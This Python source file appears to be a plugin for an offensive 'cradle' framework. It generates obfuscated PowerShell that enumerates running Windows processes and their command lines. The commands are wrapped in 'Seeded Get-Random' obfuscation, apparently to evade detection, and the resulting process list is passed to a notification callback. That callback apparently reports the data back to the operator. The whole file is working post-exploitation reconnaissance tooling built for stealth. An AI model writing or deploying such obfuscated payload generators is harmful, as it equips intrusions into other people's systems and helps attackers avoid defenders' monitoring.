from plugins._base import BaseCradlePlugin
from core.models import CradleInstance
from core.obfuscate_getrandom import get_random_obfuscated_string as sgr

class EnumProcessesPsSgr(BaseCradlePlugin):
    NAME        = "enum_processes_ps_sgr"
    DESCRIPTION = "Enumeration - Gets running processes using SGR (Seeded Get-Random) obfuscated PowerShell"
    AUTHOR      = "CyberSecN00b"

    OPTIONS = {
        **BaseCradlePlugin.OPTIONS,
        "ENUM_METHOD": {
            "description": "Enumeration Method: Get-CimInstance, Get-WmiObject, Get-Process (may not have command lines)",
            "default": "Get-CimInstance",
            "restricted_to": ["Get-CimInstance", "Get-WmiObject", "Get-Process"]
        }
    }

    def generate(self, inst: CradleInstance) -> str:
        method  = inst.options.get("ENUM_METHOD", "Get-CimInstance").lower()
        payload = []

        if method == "get-ciminstance":
            payload.append(
                f".({sgr("$proc_list = Get-CimInstance Win32_Process | Select-Object ProcessId, Name, CommandLine")});"
            )
        elif method == "get-wmiobject":
            payload.append(
                f".({sgr("$proc_list = Get-WmiObject Win32_Process | Select-Object ProcessId, Name, CommandLine")});"
            )
        else:
            payload.append(
                f".({sgr("$proc_list = Get-Process | Select-Object Id, Name, CommandLine")});"
            )

        payload.append(
            self.notification_callback_snippet(inst,{"proc_list":"$proc_list"})
        )

        return "\n".join(payload) + "\n"